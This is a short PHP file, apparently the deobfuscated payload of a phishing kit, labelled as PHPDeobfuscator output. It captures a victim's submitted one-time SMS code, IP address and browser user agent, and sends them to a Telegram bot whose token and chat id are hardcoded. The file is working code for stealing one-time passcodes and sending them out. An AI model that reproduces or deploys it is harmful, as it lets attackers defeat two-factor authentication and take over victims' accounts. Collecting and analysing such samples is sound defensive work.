<?php

/* #1: PHPDeobfuscator eval output */ 
    $zabi = getenv("REMOTE_ADDR");
    $message .= "--++-----[otp 1  ]-----++--\n";
    $message .= "-------------- BY  frag-----\n";
    $message .= "sms: " . $_POST['sms'] . "\n";
    $message .= "-------------- IP Infos ------------\n";
    $message .= "IP       : {$zabi}\n";
    $message .= "BROWSER  : " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    $message .= "----------------------By  frag ----------------------\n";
    $token = "5989729182:AAGC0nLfupDcSapq6VHjL9249IawZzKsa78";
    $data = ['text' => $message, 'chat_id' => '-954058817'];
    file_get_contents("https://api.telegram.org/bot5989729182:AAGC0nLfupDcSapq6VHjL9249IawZzKsa78/sendMessage?" . http_build_query($data));
/* END:#1 */
